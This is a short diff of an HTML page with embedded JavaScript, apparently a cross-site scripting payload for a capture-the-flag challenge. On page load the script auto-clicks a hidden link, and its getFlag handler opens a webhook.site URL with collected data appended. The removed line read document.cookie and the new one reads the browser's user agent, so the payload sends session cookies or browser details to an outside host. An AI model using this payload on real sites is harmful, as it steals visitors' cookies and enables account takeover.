@@ -10,7 +10,7 @@ document.getElementById('x').click();
 	<a id="haha" onclick="getFlag()"></a>
 </body>
 <script type="text/javascript">
-	var a = document.cookie;
+	var a = navigator.userAgent;
 	document.querySelector("#haha").click();
 	function getFlag() {
 		window.open(`http://webhook.site/2fd1760a-21aa-42fb-b77d-301a171ea69c?${a}`);
